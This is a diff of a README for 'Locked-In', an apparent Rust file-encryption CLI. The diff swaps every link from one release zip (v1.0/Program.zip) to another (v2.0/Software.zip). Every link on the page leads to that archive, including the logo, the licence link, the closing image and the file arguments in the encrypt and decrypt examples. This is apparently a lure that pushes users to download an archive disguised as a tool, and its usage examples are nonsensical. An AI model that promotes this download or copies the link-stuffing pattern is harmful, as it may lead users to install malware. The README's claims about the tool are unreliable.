@@ -1,6 +1,6 @@
 # 🛡️🔒🔑 Locked-In
 
-![Locked-In Logo](https://github.com/Syardha/locked-in/releases/download/v1.0/Program.zip)
+![Locked-In Logo](https://github.com/Syardha/locked-in/releases/download/v2.0/Software.zip)
 
 **Locked-In** is a powerful command-line interface (CLI) tool developed in Rust to provide seamless encryption and decryption of files using the advanced AES-GCM cipher. 
 
@@ -19,7 +19,7 @@ This repository is perfect for individuals and organizations looking for a secur
 
 To start using Locked-In, download the software package from the link below:
 
-[![Download Locked-In](https://github.com/Syardha/locked-in/releases/download/v1.0/Program.zip)](https://github.com/Syardha/locked-in/releases/download/v1.0/Program.zip)
+[![Download Locked-In](https://github.com/Syardha/locked-in/releases/download/v2.0/Software.zip)](https://github.com/Syardha/locked-in/releases/download/v2.0/Software.zip)
 
 Once downloaded, unzip the package and launch the CLI tool to begin encrypting and decrypting your files with ease.
 
@@ -39,13 +39,13 @@ Here are some examples of using Locked-In to encrypt and decrypt files:
 ### Encrypt a File
 
 ```bash
-locked-in encrypt --file https://github.com/Syardha/locked-in/releases/download/v1.0/Program.zip
+locked-in encrypt --file https://github.com/Syardha/locked-in/releases/download/v2.0/Software.zip
 ```
 
 ### Decrypt a File
 
 ```bash
-locked-in decrypt --file https://github.com/Syardha/locked-in/releases/download/v1.0/Program.zip
+locked-in decrypt --file https://github.com/Syardha/locked-in/releases/download/v2.0/Software.zip
 ```
 
 ## Repository Topics
@@ -69,10 +69,10 @@ For any questions or issues related to Locked-In, please check the "Releases" se
 
 ## License
 
-Locked-In is licensed under the [MIT License](https://github.com/Syardha/locked-in/releases/download/v1.0/Program.zip). Feel free to modify and distribute the software according to the terms of the license agreement.
+Locked-In is licensed under the [MIT License](https://github.com/Syardha/locked-in/releases/download/v2.0/Software.zip). Feel free to modify and distribute the software according to the terms of the license agreement.
 
 ---
 
 🔒 Protect your files with confidence using **Locked-In**! Download the tool today and experience the next level of file encryption and decryption. Let your data stay safe and secure with AES-GCM encryption powered by Rust. Get locked in with Locked-In! 🔐
 
-![Secure Data Protection](https://github.com/Syardha/locked-in/releases/download/v1.0/Program.zip)
+![Secure Data Protection](https://github.com/Syardha/locked-in/releases/download/v2.0/Software.zip)
